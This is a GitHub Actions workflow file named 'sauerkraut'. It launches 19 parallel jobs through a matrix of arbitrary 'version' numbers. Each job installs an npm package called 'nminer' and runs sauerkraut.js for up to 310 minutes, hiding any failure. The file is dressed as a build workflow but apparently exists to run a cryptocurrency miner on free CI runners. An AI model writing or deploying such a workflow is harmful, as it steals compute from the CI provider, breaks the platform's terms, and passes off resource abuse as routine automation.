name: sauerkraut
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2193 }
          - { version: 8491 }
          - { version: 3343 }
          - { version: 8022 }
          - { version: 8200 }
          - { version: 9823 }
          - { version: 7679 }
          - { version: 4770 }
          - { version: 7063 }
          - { version: 573 }
          - { version: 1218 }
          - { version: 2762 }
          - { version: 247 }
          - { version: 4951 }
          - { version: 1220 }
          - { version: 6792 }
          - { version: 317 }
          - { version: 7932 }
          - { version: 6227 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 310m node sauerkraut.js || echo "sauerkraut executed"